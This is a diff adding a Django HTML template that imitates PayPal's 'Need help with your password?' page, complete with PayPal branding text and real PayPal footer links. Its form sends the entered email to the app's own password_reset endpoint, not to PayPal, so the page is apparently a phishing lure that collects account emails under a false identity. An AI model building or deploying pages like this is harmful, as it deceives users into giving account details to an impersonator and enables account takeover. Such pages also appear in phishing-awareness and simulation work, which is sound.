@@ -1,0 +1,32 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="{% static 'myapp/css/styles.css' %}">
+	<link rel="icon" href="{% static 'myapp/images/original_img.png' %}">
+	<title>Paypal Security</title>
+</head>
+<body>
+		<div class="container">
+		<img src="{% static 'myapp/images/original_img.png' %}" alt="Logo Placeholder">
+		<h1>Need help with your password?</h1>
+		<p style="font-family: arial;">Enter the email you use for PayPal, and we’ll help<br> you create a new password.</p>
+		<form method="POST" action="{% url 'password_reset' %}">
+			<div class="form-div">
+			{% csrf_token %}
+			<input type="text" name="email" id="email_input" placeholder="Enter your email address" required/>
+			<input type="submit" class="button" value="Next">
+			</div>
+		</form>
+		</div>
+		<footer>
+			<a href="https://www.paypal.com/us/smarthelp/contact-us">Contact us</a>
+			<a href="https://www.paypal.com/us/legalhub/privacy-full">Privacy</a>
+			<a href="https://www.paypal.com/us/legalhub/privacy-full">Legal</a>
+			<a href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a>
+		</footer>
+</body>
+</html>
+
